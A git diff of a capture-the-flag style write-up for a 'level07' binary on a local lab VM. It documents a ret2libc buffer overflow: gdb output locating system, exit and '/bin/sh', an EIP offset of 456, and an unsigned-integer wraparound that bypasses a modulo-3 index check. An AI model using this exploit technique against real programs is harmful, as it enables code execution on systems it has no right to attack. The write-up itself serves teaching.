@@ -6,42 +6,44 @@
 ```
 scp -P 4242 level07@192.168.56.109:level07 binary/
 ```
-find  0xf7e2c000, 0xf7fcc000, "/bin/sh"
+
+## Buffer overflow
+
+**objective** : use the program to fill the buffer and execute `/bin/sh`
+
+```
+(gdb) find  0xf7e2c000, 0xf7fcc000, "/bin/sh"
 0xf7f897ec
 1 pattern found.
 (gdb) info funct system
-All functions matching regular expression "system":
-
-Non-debugging symbols:
-0xf7e6aed0  __libc_system
+...
 0xf7e6aed0  system
-0xf7f48a50  svcerr_systemerr
+...
 (gdb) info funct exit
-All functions matching regular expression "exit":
-
-Non-debugging symbols:
+...
 0xf7e5eb70  exit
-0xf7e5eba0  on_exit
-0xf7e5edb0  __cxa_atexit
-0xf7e5ef50  quick_exit
-0xf7e5ef80  __cxa_at_quick_exit
-0xf7ee45c4  _exit
-0xf7f27ec0  pthread_exit
-0xf7f2d4f0  __cyg_profile_func_exit
-0xf7f4bc30  svc_exit
-0xf7f55d80  atexit
+...
 ```
+- convert addresses to unsigned int
+   - `system` : 0xf7e6aed0 = 4159090384\
+   - `exit` : 0xf7e5eb70 = 4159040368\
+   - `/bin/sh` : 0xf7f897ec = 4160264172
 
-0xf7e6aed0 = 4159090384\
-0xf7e5eb70 = 4159040368\
-0xf7f897ec = 4160264172
+- eip offset found = 456
 
-offset = 456\
-456 / 4 = 114\
-460 / 4 = 115\
-464 / 4 = 116
+```
+buffer[index * 4] = number;
+```
+- `system` at index 114 (456 / 4)
+- `exit` at index 115
+- `/bin/sh` at index 116\
 
-114 => 1073741938
+index must not be a multiple of 3, but 114 % 3 = 0.\
+max unsigned int : 4294967296\
+4294967296 / 4 + 114 = 1073741938\
+=> (unsigned int)1073741938 = 114\
+1073741938 % 3 = 1\
+so `system` at index 1073741938
 
 ```
 $ ./level07 
